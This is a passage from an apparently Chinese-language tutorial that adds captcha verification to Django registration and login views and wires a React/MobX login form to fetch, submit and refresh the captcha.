                <span style="color: #008b8b;">this</span>.isReg = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                message.warning(reason.msg);
            }
        );
    }

    getCaptcha() {
        axios.get({
            url:<span style="color: #8b2252;">'/users/getcaptcha'</span>,
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #b22222;">// </span><span style="color: #b22222;">{'key':key, 'image_url':image_url}</span>
                value.image_url = <span style="color: #8b2252;">'/api'</span> + value.image_url;
                <span style="color: #008b8b;">this</span>.captcha = value;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                message.warning(reason.msg);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">userService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();
<span style="color: #a020f0;">export</span> {userService}
</pre>
</div>

<p>
访问 <a href="http://localhost:3000/login">http://localhost:3000/login</a> 可看到验证码图片
</p>
</div>
</div>
<div id="outline-container-h:8861d8bd-4098-4b0d-8985-6faa56aa00ff" class="outline-4">
<h4 id="h:8861d8bd-4098-4b0d-8985-6faa56aa00ff">后端-登录认证</h4>
<div class="outline-text-4" id="text-h:8861d8bd-4098-4b0d-8985-6faa56aa00ff">
<p>
messages.py  增加验证码错误
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">class</span> <span style="color: #228b22;">Messages</span>:
    <span style="color: #a0522d;">INVALID_USERNAME_OR_PASSWORD</span> = {<span style="color: #8b2252;">'code'</span>:1, <span style="color: #8b2252;">'msg'</span>:<span style="color: #8b2252;">'&#29992;&#25143;&#21517;&#25110;&#23494;&#30721;&#38169;&#35823;'</span>}
    <span style="color: #a0522d;">BAD_REQUEST</span> = {<span style="color: #8b2252;">'code'</span>:2, <span style="color: #8b2252;">'msg'</span>:<span style="color: #8b2252;">'&#35831;&#27714;&#20449;&#24687;&#38169;&#35823;'</span>}
    <span style="color: #a0522d;">USER_EXISTS</span> = {<span style="color: #8b2252;">'code'</span>:3, <span style="color: #8b2252;">'msg'</span>:<span style="color: #8b2252;">'&#29992;&#25143;&#24050;&#23384;&#22312;'</span>}
    <span style="color: #a0522d;">NOT_FOUND</span> = {<span style="color: #8b2252;">'code'</span>:4, <span style="color: #8b2252;">'msg'</span>:<span style="color: #8b2252;">'&#36164;&#28304;&#19981;&#23384;&#22312;'</span>}
    <span style="color: #a0522d;">WRONG_CAPTCHA</span> = {<span style="color: #8b2252;">'code'</span>:5, <span style="color: #8b2252;">'msg'</span>:<span style="color: #8b2252;">'&#39564;&#35777;&#30721;&#38169;&#35823;'</span>}
</pre>
</div>

<p>
user/views.py
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpRequest, HttpResponse, JsonResponse
<span style="color: #a020f0;">from</span> django.contrib.auth.models <span style="color: #a020f0;">import</span> User
<span style="color: #a020f0;">from</span> django.contrib.auth <span style="color: #a020f0;">import</span> authenticate, login, logout
<span style="color: #a020f0;">from</span> django.views.decorators.http <span style="color: #a020f0;">import</span> require_GET, require_POST, require_http_methods
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.contrib.auth.decorators import login_required  #&#20889;&#30340;&#38750;&#24120;&#22909;</span>
<span style="color: #a020f0;">from</span> functools <span style="color: #a020f0;">import</span> wraps
<span style="color: #a020f0;">from</span> django.contrib.sessions.backends.db <span style="color: #a020f0;">import</span> SessionStore
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #228b22;">@require_POST</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">reg</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(payload), payload)
        <span style="color: #a0522d;">username</span> = payload.get(<span style="color: #8b2252;">'username'</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#29992;&#25143;&#21517;&#26159;&#21542;&#23384;&#22312;&#65311;&#27983;&#35272;&#22120;&#31471;&#26377;&#27809;&#26377;&#25552;&#37266;&#36807;&#29992;&#25143;&#65292;&#27704;&#36828;&#19981;&#35201;&#30456;&#20449;&#23458;&#25143;&#31471;</span>
        <span style="color: #a0522d;">count</span> = User.objects.<span style="color: #483d8b;">filter</span>(username=username).count()
        <span style="color: #a020f0;">if</span> count&gt;0:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.USER_EXISTS)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#23384;&#20648;</span>
        <span style="color: #a0522d;">email</span> = payload[<span style="color: #8b2252;">'email'</span>]
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = User.objects.create_user(username, email, password)
        <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(user), user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19968;&#26086;&#21019;&#24314;&#25104;&#21151;&#65292;&#30331;&#24405;&#25104;&#21151;&#30475;&#21040;&#30340;&#26159;User&#23454;&#20363;</span>

        <span style="color: #a020f0;">return</span> JsonResponse({}, status=201)
        <span style="color: #b22222;">#</span><span style="color: #b22222;">return HttpResponse(content_type='application/json', status=201)</span>
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#39564;&#35777;&#30721;&#35013;&#39280;&#22120;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">test_captcha</span>(viewfunc):
    <span style="color: #228b22;">@wraps</span>(viewfunc)
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(request:HttpRequest, *args, **kwargs):
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
            <span style="color: #a0522d;">challenge</span> = payload[<span style="color: #8b2252;">'challenge'</span>]
            <span style="color: #a0522d;">key</span> = payload[<span style="color: #8b2252;">'key'</span>]
            <span style="color: #a020f0;">if</span> challenge.lower() == CaptchaStore.objects.get(hashkey=key).response:
                <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwargs)
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.WRONG_CAPTCHA)
    <span style="color: #a020f0;">return</span> wrapper

<span style="color: #228b22;">@require_POST</span>
<span style="color: #228b22;">@test_captcha</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_login</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#39564;&#35777;&#30721;&#21028;&#26029; &#20351;&#29992;&#35013;&#39280;&#22120;</span>
        <span style="color: #a0522d;">username</span> = payload[<span style="color: #8b2252;">'username'</span>] <span style="color: #b22222;"># </span><span style="color: #b22222;">&#30331;&#24405;  &#35813;&#22914;&#20309;&#22788;&#29702;&#65311;</span>
        <span style="color: #a0522d;">password</span> = payload[<span style="color: #8b2252;">'password'</span>]
        <span style="color: #a0522d;">user</span> = authenticate(username=username, password=password)
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
        <span style="color: #a020f0;">if</span> user <span style="color: #a020f0;">and</span> user.is_active: <span style="color: #b22222;">#</span><span style="color: #b22222;">&#29992;&#25143;&#23494;&#30721;&#27491;&#30830;</span>
            login(request, user) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21508;&#31181;&#21518;&#21488;jsp, php&#37117;&#20064;&#24815;&#36890;&#36807;request.session&#21462;session&#20540;&#65307;user&#32465;&#23450;&#21040;request&#19978;</span>
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'=*'</span>*30)
            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#26377;&#24517;&#35201;&#65292;&#21487;&#20197;&#20351;&#29992;session&#20445;&#23384;&#19968;&#20123;&#20449;&#24687;</span>
            <span style="color: #a0522d;">session</span>:<span style="color: #228b22;">SessionStore</span> = request.session
            <span style="color: #b22222;"># </span><span style="color: #b22222;">session.set_expiry(60*60*24) # &#35774;&#32622;&#36807;&#26399;&#26102;&#38388;&#65292;&#21333;&#20301;&#31186;</span>
            <span style="color: #a0522d;">session</span>[<span style="color: #8b2252;">'user_info'</span>] = {
                <span style="color: #8b2252;">'id'</span>: request.user.<span style="color: #483d8b;">id</span>,
                <span style="color: #8b2252;">'username'</span>:request.user.username
            }
            <span style="color: #a020f0;">return</span> JsonResponse({}) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#20102;login&#20989;&#25968;&#65292;&#36820;&#22238;&#26102;&#23601;&#24102;&#30528;set-cookie&#65292;&#35774;&#32622;sessionid</span>
        <span style="color: #a020f0;">else</span>:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.INVALID_USERNAME_OR_PASSWORD, status=200)
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST, status=200)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">login_required</span>(exclude_methods):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">_login_required</span>(viewfunc):
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21442;&#29031;django.contrib.auth.decorators.login_required</span>
        <span style="color: #228b22;">@wraps</span>(viewfunc)
        <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(request, *args, **kwars):
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span> * 30)
            <span style="color: #a0522d;">method</span> = request.method.lower()
            <span style="color: #a020f0;">if</span> method <span style="color: #a020f0;">in</span> exclude_methods:
                <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwars)
            <span style="color: #a020f0;">else</span>:
                <span style="color: #a020f0;">if</span> request.user.is_authenticated:
                    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'&#35748;&#35777;&#20102;'</span>)
                    <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwars)
                <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'&#26410;&#35748;&#35777;&#36890;&#36807;'</span>)
                <span style="color: #a020f0;">return</span> HttpResponse(status=401)
        <span style="color: #a020f0;">return</span> wrapper
    <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">callable</span>(exclude_methods): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20860;&#23481;&#20043;&#21069;&#35843;&#29992;&#65292;&#22914;&#26524;&#26159;&#26080;&#21442;&#35843;&#29992;&#23601;&#26159;&#20989;&#25968;&#65292;&#24110;&#23427;&#24448;&#37324;&#38754;&#35843;&#29992;&#19968;&#23618;&#36820;&#22238;</span>
        <span style="color: #a0522d;">fn</span> = exclude_methods
        <span style="color: #a0522d;">exclude_methods</span> = () <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#31034;&#27809;&#20160;&#20040;&#26041;&#27861;method&#35201;&#25490;&#38500;&#65292;&#37117;&#35201;&#35748;&#35777;</span>
        <span style="color: #a020f0;">return</span> _login_required(fn)
    <span style="color: #a020f0;">return</span> _login_required

<span style="color: #228b22;">@login_required</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required  # &#31561;&#20215;&#20110; user_logout = login_required(user_logout)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">@login_required(login_url='users/login') # &#31561;&#20215;&#20110; user_logout = login_required(login_url='users/login')(user_logout)</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">user_logout</span>(request:HttpRequest):
    logout(request) <span style="color: #b22222;"># </span><span style="color: #b22222;">request.session, request.user &#28165;&#31354;&#24403;&#21069;&#29992;&#25143;&#30331;&#24405;&#29366;&#24577;&#65292;&#21253;&#25324;session&#21644;&#25968;&#25454;&#24211;django_session&#35760;&#24405;</span>
    <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'&#30331;&#20986;&#25104;&#21151;'</span>, status=200)

<span style="color: #a020f0;">from</span> captcha.models <span style="color: #a020f0;">import</span> CaptchaStore
<span style="color: #a020f0;">from</span> captcha.helpers <span style="color: #a020f0;">import</span> captcha_image_url

<span style="color: #228b22;">@require_GET</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_captcha</span>(request:HttpRequest):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">key</span> = CaptchaStore.generate_key()
        <span style="color: #a0522d;">image_url</span> = captcha_image_url(key)
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'key'</span>:key, <span style="color: #8b2252;">'image_url'</span>:image_url})
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.NOT_FOUND)
</pre>
</div>
</div>
</div>
<div id="outline-container-h:3bdb6d98-eadb-41ed-a186-050b6ee7784e" class="outline-4">
<h4 id="h:3bdb6d98-eadb-41ed-a186-050b6ee7784e">前端- 登录认证</h4>
<div class="outline-text-4" id="text-h:3bdb6d98-eadb-41ed-a186-050b6ee7784e">
<p>
component/login.js增加填写验证码信息
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/login.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">"../css/login.css"</span>;
<span style="color: #a020f0;">import</span> {userService as service} from <span style="color: #8b2252;">'../service/user'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">export default class Login extends React.Component{</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">render() {</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">return &lt;_Login service={service}/&gt;</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>

@inject({service})
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component{
    constructor(props) {
        <span style="color: #a020f0;">super</span>(props);
        <span style="color: #008b8b;">this</span>.props.service.getCaptcha();
    }

    handleClick(event) {
      console.log(event); <span style="color: #b22222;">// </span><span style="color: #b22222;">window.event</span>
      event.preventDefault();
      console.log(<span style="color: #8b2252;">'click'</span>)
      <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">username</span>, <span style="color: #a0522d;">password</span>, <span style="color: #a0522d;">challenge</span>, <span style="color: #a0522d;">key</span>] = event.target.form;
      <span style="color: #008b8b;">this</span>.props.service.login(
        username.value, password.value,
        challenge.value, key.value,
    );
    }
    render() {
        console.log(<span style="color: #8b2252;">'login render ~~~~~'</span>)
        <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.props.service.isLogin) {
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/profile'</span> /&gt;; <span style="color: #b22222;">// </span><span style="color: #b22222;">to&#34920;&#31034;&#36339;&#36716;&#21040;&#21738;&#37324;</span>
        }

        <span style="color: #a020f0;">const</span> {key=<span style="color: #8b2252;">''</span>, image_url=<span style="color: #8b2252;">''</span>} = <span style="color: #008b8b;">this</span>.props.service.captcha;

        <span style="color: #a020f0;">return</span>(
            &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"challenge"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#39564;&#35777;&#30721;"</span> <span style="color: #a0522d;">style</span>={{width:<span style="color: #8b2252;">'70%'</span>}}/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">'hidden'</span> <span style="color: #a0522d;">value</span>={key} /&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">img</span> <span style="color: #a0522d;">src</span>={image_url} /&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#36824;&#26410;&#27880;&#20876;&#65311; </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        )
    }
}
</pre>
</div>

<p>
service/user.js后台传送验证码信息challenge, key
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/user.js</span><span style="color: #b22222;">*/</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">import axios from 'axios';</span>
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;

<span style="color: #a020f0;">class</span> UserService {
    @observable isLogin = <span style="color: #008b8b;">false</span>;
    @observable isReg = <span style="color: #008b8b;">false</span>;
    @observable captcha = {};

    login(username, password, challenge, key) {
        console.log(username, password, challenge, key); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/login'</span>,
            data:{username, password, challenge, key}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isLogin = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                <span style="color: #b22222;">// </span><span style="color: #b22222;">window.alert(reason.msg);</span>
                message.warning(reason.msg, 8); <span style="color: #b22222;">// </span><span style="color: #b22222;">8&#31186;&#28040;&#22833;</span>
            }
        );
    }

    reg(username, email, password) {
        console.log(username, email, password); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/users/'</span>,
            data:{username, email, password}
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #008b8b;">this</span>.isReg = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                message.warning(reason.msg);
            }
        );
    }

    getCaptcha() {
        axios.get({
            url:<span style="color: #8b2252;">'/users/getcaptcha'</span>,
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                <span style="color: #b22222;">// </span><span style="color: #b22222;">{'key':key, 'image_url':image_url}</span>
                value.image_url = <span style="color: #8b2252;">'/api'</span> + value.image_url;
                <span style="color: #008b8b;">this</span>.captcha = value;
            },
            reason =&gt; {
                console.log(reason);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#22788;&#29702;&#22833;&#36133;&#65292;&#32473;&#29992;&#25143;&#21451;&#22909;&#24615;&#25552;&#31034;</span>
                message.warning(reason.msg);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">userService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">UserService</span>();
<span style="color: #a020f0;">export</span> {userService}
</pre>
</div>
</div>
</div>
<div id="outline-container-h:45878983-da55-42ad-a9e4-d7ac007cd830" class="outline-4">
<h4 id="h:45878983-da55-42ad-a9e4-d7ac007cd830">前端-刷新验证码</h4>
<div class="outline-text-4" id="text-h:45878983-da55-42ad-a9e4-d7ac007cd830">
<p>
component/login.js增加点验证码图片事件
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">component/login.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">"../css/login.css"</span>;
<span style="color: #a020f0;">import</span> {userService as service}  from <span style="color: #8b2252;">'../service/user'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">export default class Login extends React.Component{</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">render() {</span>
<span style="color: #b22222;">//         </span><span style="color: #b22222;">return &lt;_Login service={service}/&gt;</span>
<span style="color: #b22222;">//     </span><span style="color: #b22222;">}</span>
<span style="color: #b22222;">// </span><span style="color: #b22222;">}</span>

@inject({service})
@observer
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component {
    constructor(props) {
        <span style="color: #a020f0;">super</span>(props);
        <span style="color: #008b8b;">this</span>.props.service.getCaptcha();
    }

    handleClick(event) {
        console.log(event); <span style="color: #b22222;">// </span><span style="color: #b22222;">window.event</span>
        event.preventDefault();
        console.log(<span style="color: #8b2252;">'click'</span>)
        <span style="color: #a020f0;">const</span> [<span style="color: #a0522d;">username</span>, <span style="color: #a0522d;">password</span>, <span style="color: #a0522d;">challenge</span>, <span style="color: #a0522d;">key</span>] = event.target.form;
        <span style="color: #008b8b;">this</span>.props.service.login(
            username.value, password.value,
            challenge.value, key.value,
        );
    }

    handleRefresh(){
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#35831;&#27714;service&#23618;&#65292;&#35775;&#38382;refresh&#65292;&#37325;&#26032;&#25552;&#20379;&#26032;&#30340;key&#21644;image_url</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#35206;&#30422;&#24403;&#21069;&#30340;img src&#21644;input hidden</span>
        <span style="color: #008b8b;">this</span>.props.service.captchaRefresh();

    }

    render() {
        console.log(<span style="color: #8b2252;">'login render ~~~~~'</span>)
        <span style="color: #a020f0;">if</span> (<span style="color: #008b8b;">this</span>.props.service.isLogin) {
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/profile'</span> /&gt;; <span style="color: #b22222;">// </span><span style="color: #b22222;">to&#34920;&#31034;&#36339;&#36716;&#21040;&#21738;&#37324;</span>
        }

        <span style="color: #a020f0;">const</span> {key=<span style="color: #8b2252;">''</span>, image_url=<span style="color: #8b2252;">''</span>} = <span style="color: #008b8b;">this</span>.props.service.captcha;

        <span style="color: #a020f0;">return</span> (
            &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                    </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span> /&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span> <span style="color: #a0522d;">defaultValue</span>=<span style="color: #8b2252;">'abc'</span> /&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"challenge"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#39564;&#35777;&#30721;"</span> <span style="color: #a0522d;">style</span>={{width:<span style="color: #8b2252;">'70%'</span>}}/&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">'hidden'</span> <span style="color: #a0522d;">value</span>={key} /&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">img</span> <span style="color: #a0522d;">src</span>={image_url} <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleRefresh.bind(<span style="color: #008b8b;">this</span>)} /&gt;
<span style="color: #000000; background-color: #ffffff;">                        </span>&lt;<span style="color: #0000ff;">button</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
